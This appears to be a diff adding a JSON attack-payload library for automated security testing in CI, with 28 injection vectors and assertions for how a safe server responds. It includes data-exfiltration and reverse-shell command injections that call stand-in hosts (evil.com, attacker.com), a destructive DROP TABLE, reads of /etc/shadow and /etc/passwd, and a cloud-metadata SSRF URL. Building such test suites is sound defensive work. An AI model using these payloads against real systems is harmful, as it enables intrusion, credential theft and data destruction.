@@ -1,0 +1,503 @@
+{
+  "id": "security",
+  "name": "Security Injection Attack Payload Library",
+  "category": "Security Harness",
+  "description": "Fixed, auditable attack payload library with machine-readable placement metadata and automated CI assertion rules.",
+  "totalVectors": 28,
+  "vectors": [
+    {
+      "id": "sqli_1",
+      "category": "SQL Injection",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "' OR '1'='1' --",
+      "expected_safe_behavior": "Escaped or rejected by parameterized SQL queries",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "syntax error at or near",
+          "unclosed quotation mark"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Classic authentication bypass SQL injection vector.",
+      "payload_b64": "JyBPUiAnMSc9JzEnIC0t"
+    },
+    {
+      "id": "sqli_2",
+      "category": "SQL Injection",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "1; DROP TABLE users; --",
+      "expected_safe_behavior": "Sanitized or rejected; DDL statements blocked",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "table users dropped",
+          "syntax error"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Destructive SQL statement injection payload.",
+      "payload_b64": "MTsgRFJPUCBUQUJMRSB1c2VyczsgLS0="
+    },
+    {
+      "id": "sqli_3",
+      "category": "SQL Injection",
+      "target": "query",
+      "field_type_hint": "string",
+      "payload": "admin' UNION SELECT null, username, password FROM users --",
+      "expected_safe_behavior": "Union query injection blocked by ORM/query builder",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "password",
+          "hash",
+          "users"
+        ],
+        "response_sanitized": true
+      },
+      "description": "UNION-based data exfiltration SQL injection.",
+      "payload_b64": "YWRtaW4nIFVOSU9OIFNFTEVDVCBudWxsLCB1c2VybmFtZSwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="
+    },
+    {
+      "id": "sqli_4",
+      "category": "SQL Injection",
+      "target": "query",
+      "field_type_hint": "string",
+      "payload": "1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)",
+      "expected_safe_behavior": "Error-based SQLi payload rejected safely",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "Duplicate entry",
+          "information_schema"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Error-based information schema extraction payload.",
+      "payload_b64": "MSBBTkQgKFNFTEVDVCAxIEZST00gKFNFTEVDVCBDT1VOVCgqKSwgQ09OQ0FUKChTRUxFQ1QgdmVyc2lvbigpKSwgRkxPT1IoUkFORCgwKSoyKSkgeCBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgR1JPVVAgQlkgeClhKQ=="
+    },
+    {
+      "id": "sqli_5",
+      "category": "SQL Injection",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "'; WAITFOR DELAY '0:0:5'--",
+      "expected_safe_behavior": "Time-delay query execution blocked",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "WAITFOR"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Time-based blind SQL injection vector.",
+      "payload_b64": "JzsgV0FJVEZPUiBERUxBWSAnMDowOjUnLS0="
+    },
+    {
+      "id": "nosqli_1",
+      "category": "NoSQL Injection",
+      "target": "body",
+      "field_type_hint": "json_object",
+      "payload": {
+        "$gt": ""
+      },
+      "expected_safe_behavior": "Type-checked as string; Mongo operator objects rejected",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "$gt",
+          "Can't canonicalize query"
+        ],
+        "response_sanitized": true
+      },
+      "description": "MongoDB query operator injection vector for auth bypass.",
+      "payload_b64": "eyIkZ3QiOiIifQ=="
+    },
+    {
+      "id": "nosqli_2",
+      "category": "NoSQL Injection",
+      "target": "body",
+      "field_type_hint": "json_object",
+      "payload": {
+        "$where": "this.password.length > 0"
+      },
+      "expected_safe_behavior": "$where JS code execution in MongoDB query disabled",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "$where"
+        ],
+        "response_sanitized": true
+      },
+      "description": "MongoDB $where Javascript execution injection vector.",
+      "payload_b64": "eyIkd2hlcmUiOiJ0aGlzLnBhc3N3b3JkLmxlbmd0aCA+IDAifQ=="
+    },
+    {
+      "id": "nosqli_3",
+      "category": "NoSQL Injection",
+      "target": "body",
+      "field_type_hint": "json_object",
+      "payload": {
+        "$ne": null
+      },
+      "expected_safe_behavior": "Not-equal operator object stripped or type-checked to string",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "$ne"
+        ],
+        "response_sanitized": true
+      },
+      "description": "MongoDB $ne wildcard matching vector.",
+      "payload_b64": "eyIkbmUiOm51bGx9"
+    },
+    {
+      "id": "xss_1",
+      "category": "Cross-Site Scripting (XSS)",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "<script>alert('xss')</script>",
+      "expected_safe_behavior": "HTML escaped to &lt;script&gt; or rejected",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "<script>alert('xss')</script>"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Reflected XSS script execution payload.",
+      "payload_b64": "PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="
+    },
+    {
+      "id": "xss_2",
+      "category": "Cross-Site Scripting (XSS)",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "<img src=x onerror=alert('xss') />",
+      "expected_safe_behavior": "Attributes sanitized; event handlers stripped",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "onerror="
+        ],
+        "response_sanitized": true
+      },
+      "description": "DOM-based event handler XSS injection.",
+      "payload_b64": "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCd4c3MnKSAvPg=="
+    },
+    {
+      "id": "xss_3",
+      "category": "Cross-Site Scripting (XSS)",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "javascript:/*-->*/</title></style></textarea></script></xmp><svg/onload='+/\"/../onload=alert(1)//'>",
+      "expected_safe_behavior": "Polyglot XSS payload neutralized across all contexts",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "javascript:"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Polyglot XSS payload effective across HTML/JS/Attribute contexts.",
+      "payload_b64": "amF2YXNjcmlwdDovKi0tPiovPC90aXRsZT48L3N0eWxlPjwvdGV4dGFyZWE+PC9zY3JpcHQ+PC94bXA+PHN2Zy9vbmxvYWQ9JysvIi8uLi9vbmxvYWQ9YWxlcnQoMSkvLyc+"
+    },
+    {
+      "id": "xss_4",
+      "category": "Cross-Site Scripting (XSS)",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "<iframe src=\"javascript:alert(`xss`)\"></iframe>",
+      "expected_safe_behavior": "iframe element or javascript URI scheme stripped",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "<iframe",
+          "javascript:"
+        ],
+        "response_sanitized": true
+      },
+      "description": "iframe Javascript URI scheme XSS payload.",
+      "payload_b64": "PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoYHhzc2ApIj48L2lmcmFtZT4="
+    },
+    {
+      "id": "xss_5",
+      "category": "Cross-Site Scripting (XSS)",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "<svg><animate onbegin=alert(1) attributeName=x>",
+      "expected_safe_behavior": "SVG animate vector event handler stripped",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "onbegin="
+        ],
+        "response_sanitized": true
+      },
+      "description": "SVG animation event-driven XSS vector.",
+      "payload_b64": "PHN2Zz48YW5pbWF0ZSBvbmJlZ2luPWFsZXJ0KDEpIGF0dHJpYnV0ZU5hbWU9eD4="
+    },
+    {
+      "id": "cmdi_1",
+      "category": "Command Injection",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "; cat /etc/passwd | mail attacker@evil.com",
+      "expected_safe_behavior": "Subshell execution disabled; arguments escaped",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "root:x:0:0"
+        ],
+        "response_sanitized": true
+      },
+      "description": "OS command execution shell pipe payload.",
+      "payload_b64": "OyBjYXQgL2V0Yy9wYXNzd2QgfCBtYWlsIGF0dGFja2VyQGV2aWwuY29t"
+    },
+    {
+      "id": "cmdi_2",
+      "category": "Command Injection",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "`id` && $(whoami)",
+      "expected_safe_behavior": "Backtick and shell substitution sequences escaped",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "uid=",
+          "gid="
+        ],
+        "response_sanitized": true
+      },
+      "description": "Command substitution backtick execution payload.",
+      "payload_b64": "YGlkYCAmJiAkKHdob2FtaSk="
+    },
+    {
+      "id": "cmdi_3",
+      "category": "Command Injection",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "127.0.0.1; nc -e /bin/bash attacker.com 4444",
+      "expected_safe_behavior": "Reverse shell Netcat command chaining blocked",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "nc -e"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Reverse shell Netcat injection vector.",
+      "payload_b64": "MTI3LjAuMC4xOyBuYyAtZSAvYmluL2Jhc2ggYXR0YWNrZXIuY29tIDQ0NDQ="
+    },
+    {
+      "id": "path_1",
+      "category": "Path Traversal",
+      "target": "path",
+      "field_type_hint": "filename",
+      "payload": "../../../../../etc/passwd",
+      "expected_safe_behavior": "Path resolved within sandbox root; traversal blocked",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "root:x:0:0"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Directory path traversal vector.",
+      "payload_b64": "Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=="
+    },
+    {
+      "id": "path_2",
+      "category": "Path Traversal",
+      "target": "path",
+      "field_type_hint": "filename",
+      "payload": "..%252f..%252f..%252fwinnt%252fsystem32%252fcmd.exe",
+      "expected_safe_behavior": "Double-URL encoded path traversal blocked",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "[System32]"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Double URL encoded path traversal attack.",
+      "payload_b64": "Li4lMjUyZi4uJTI1MmYuLiUyNTJmd2lubnQlMjUyZnN5c3RlbTMyJTI1MmZjbWQuZXhl"
+    },
+    {
+      "id": "path_3",
+      "category": "Path Traversal",
+      "target": "path",
+      "field_type_hint": "filename",
+      "payload": "....//....//....//etc/shadow",
+      "expected_safe_behavior": "Recursive dot-slash strip bypass blocked",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "shadow"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Nested dot-slash strip replacement bypass path traversal.",
+      "payload_b64": "Li4uLi8vLi4uLi8vLi4uLi8vZXRjL3NoYWRvdw=="
+    },
+    {
+      "id": "proto_1",
+      "category": "Prototype Pollution",
+      "target": "body",
+      "field_type_hint": "json_object",
+      "payload": {},
+      "expected_safe_behavior": "Key forbidden or frozen Object prototype unaffected",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "polluted: true"
+        ],
+        "response_sanitized": true
+      },
+      "description": "__proto__ key prototype pollution vector.",
+      "payload_b64": "e30="
+    },
+    {
+      "id": "proto_2",
+      "category": "Prototype Pollution",
+      "target": "body",
+      "field_type_hint": "json_object",
+      "payload": {
+        "constructor.prototype.isAdmin": true
+      },
+      "expected_safe_behavior": "Constructor prototype property mutation rejected",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "isAdmin: true"
+        ],
+        "response_sanitized": true
+      },
+      "description": "constructor.prototype property path injection vector.",
+      "payload_b64": "eyJjb25zdHJ1Y3Rvci5wcm90b3R5cGUuaXNBZG1pbiI6dHJ1ZX0="
+    },
+    {
+      "id": "proto_3",
+      "category": "Prototype Pollution",
+      "target": "body",
+      "field_type_hint": "json_object",
+      "payload": {
+        "prototype.status": "pwned"
+      },
+      "expected_safe_behavior": "Prototype dictionary assignment sanitized safely",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "pwned"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Direct prototype property modification payload.",
+      "payload_b64": "eyJwcm90b3R5cGUuc3RhdHVzIjoicHduZWQifQ=="
+    },
+    {
+      "id": "jwt_1",
+      "category": "JWT Authentication Bypass",
+      "target": "header",
+      "field_type_hint": "jwt_header",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.",
+      "expected_safe_behavior": "JWT with 'none' algorithm strictly rejected by authorization verifier",
+      "expected_assertion": {
+        "status_not": 200,
+        "body_not_contains": [
+          "authenticated: true"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Unsigned JWT token with 'none' algorithm payload.",
+      "payload_b64": "ZXlKaGJHY2lPaUp1YjI1bElpd2lkSGx3SWpvaVNsZFVJbjAuZXlKemRXSWlPaUl4TWpNME5UWTNPRGt3SWl3aWJtRnRaU0k2SWtGa2JXbHVJaXdpYVhOQlpHMXBiaUk2ZEhKMVpYMC4="
+    },
+    {
+      "id": "jwt_2",
+      "category": "JWT Authentication Bypass",
+      "target": "header",
+      "field_type_hint": "jwt_header",
+      "payload": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.INVALID_SIG",
+      "expected_safe_behavior": "JWT with invalid signature rejected with 401 Unauthorized",
+      "expected_assertion": {
+        "status_not": 200,
+        "body_not_contains": [
+          "admin_granted"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Forged RSA256 signature JWT payload.",
+      "payload_b64": "QmVhcmVyIGV5SmhiR2NpT2lKU1V6STFOaUo5LmV5SnpkV0lpT2lKaFpHMXBiaUo5LklOVkFMSURfU0lH"
+    },
+    {
+      "id": "jwt_3",
+      "category": "JWT Authentication Bypass",
+      "target": "header",
+      "field_type_hint": "jwt_header",
+      "payload": "Bearer null",
+      "expected_safe_behavior": "Literal string 'null' token handled without crashing auth middleware",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "NullPointerException"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Malformed Authorization header value.",
+      "payload_b64": "QmVhcmVyIG51bGw="
+    },
+    {
+      "id": "ssrf_1",
+      "category": "SSRF (Server-Side Request Forgery)",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "expected_safe_behavior": "Cloud metadata IP range (169.254.x.x) blocked by egress firewall",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "iam/security-credentials"
+        ],
+        "response_sanitized": true
+      },
+      "description": "AWS cloud metadata service SSRF URL vector.",
+      "payload_b64": "aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw=="
+    },
+    {
+      "id": "ssrf_2",
+      "category": "SSRF (Server-Side Request Forgery)",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "http://localhost:22",
+      "expected_safe_behavior": "Loopback IP addresses (127.0.0.1 / localhost) blocked for outbound webhooks",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "SSH-2.0"
+        ],
+        "response_sanitized": true
+      },
+      "description": "Internal loopback SSH port scanning SSRF payload.",
+      "payload_b64": "aHR0cDovL2xvY2FsaG9zdDoyMg=="
+    },
+    {
+      "id": "xxe_1",
+      "category": "XML External Entity (XXE)",
+      "target": "body",
+      "field_type_hint": "string",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "expected_safe_behavior": "External DTD parsing disabled; entity expansion rejected",
+      "expected_assertion": {
+        "status_not": 500,
+        "body_not_contains": [
+          "root:x:0:0"
+        ],
+        "response_sanitized": true
+      },
+      "description": "XML external entity local file disclosure payload.",
+      "payload_b64": "PD94bWwgdmVyc2lvbj0iMS4wIj8+PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPjxmb28+Jnh4ZTs8L2Zvbz4="
+    }
+  ]
+}
